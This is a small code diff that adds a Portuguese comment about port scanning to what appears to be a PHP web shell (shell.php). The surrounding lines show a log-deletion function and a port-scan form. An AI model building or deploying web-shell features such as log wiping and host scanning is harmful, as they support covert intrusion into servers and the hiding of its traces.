@@ -859,6 +859,7 @@ function dellog(){
 	echo "Log deletado!";
 }
 
+//Função para o escaneamento de portas em um host
 function pscan(){
 	echo "
 	<form action='shell.php?pag=pscan' method='post'>
